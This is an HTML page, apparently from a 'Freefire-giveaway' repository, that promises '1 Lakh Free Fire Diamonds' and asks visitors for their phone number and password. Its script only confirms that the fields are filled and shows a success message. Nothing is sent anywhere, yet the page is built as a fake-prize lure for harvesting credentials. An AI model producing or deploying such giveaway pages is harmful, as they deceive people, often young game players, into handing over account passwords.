# Freefire-giveaway- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamond Giveaway</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #111;
            color: white;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background: #222;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
        }
        button {
            background: gold;
            color: black;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        img {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://example.com/diamond.png" alt="Free Fire Diamonds">
        <h2>Win 1 Lakh Free Fire Diamonds!</h2>
        <p>Enter your details to participate.</p>
        <input type="text" placeholder="Enter Phone Number +91" id="phone">
        <input type="password" placeholder="Enter Password" id="password">
        <button onclick="submitEntry()">Submit Entry</button>
        <p id="message"></p>
    </div>

    <script>
        function submitEntry() {
            let phone = document.getElementById("phone").value;
            let password = document.getElementById("password").value;
            let message = document.getElementById("message");
            
            if (phone && password) {
                message.innerHTML = "Entry Submitted Successfully! Winner will be announced soon.";
                message.style.color = "green";
            } else {
                message.innerHTML = "Please fill all fields!";
                message.style.color = "red";
            }
        }
    </script>
</body>
</html>
